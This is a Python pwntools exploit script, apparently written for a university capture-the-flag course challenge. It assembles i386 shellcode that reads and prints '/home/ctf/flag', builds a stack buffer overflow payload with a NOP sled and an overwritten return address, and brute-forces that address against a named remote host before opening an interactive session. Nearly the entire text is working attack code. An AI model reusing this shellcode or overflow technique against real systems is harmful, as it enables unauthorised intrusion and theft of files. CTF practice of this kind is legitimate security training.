from pwn import *

context.arch = "i386"
context.os = "linux"

shellcode = asm(\
    '''
    xor eax, eax
    push eax
    jmp short shell
start:
    xor eax, eax
    xor edx, edx
    pop ebx
    mov al, 0x5
    xor ecx, ecx
    xor edx, edx
    int 0x80

    xor edx, edx
    mov dl, 0x40
    sub esp, edx
    mov ebx, eax
    xor eax, eax
    mov al, 3
    mov ecx, esp
    int 0x80

    xor eax, eax
    xor ebx, ebx
    xor edx, edx
    mov al, 4
    mov bl, 1
    mov ecx, esp
    mov dl, 0x40
    int 0x80

    mov al, 1
    xor ebx, ebx
    int 0x80

    shell:
        call start
        .ascii "/home/ctf/flag"
''')

# S = process("./bin")

username = 0xffffcd14
eip = 0xffffce3c
offset = eip - username

payload = b"A" * offset + p32(eip + 300) + 500 * b"\x90" + shellcode

def attempt(offset, eip, shellcode):
    for i in range(0, 400):
        try:
            #S = process("./bin")
            S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10008)
            payload = b'A' * offset + p32(eip -30000+ i*100) + b'\x90' * 500 + shellcode
            print(S.recvuntil(b" your username: "))
            S.sendline(payload)
            output = S.recvall()
            print(f"Attempt {i} succeeded")
            print(output)
            if b"STT" in output:
                return i
            S.close()
        except EOFError as e:
            print(f"Attempt {i} failed: {e}")


#print(attempt(offset, eip, shellcode))
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10008)
payload = b'A' * offset + p32(eip -30000+ 338*100) + b'\x90' * 500 + shellcode
S.sendline(payload)
S.interactive()
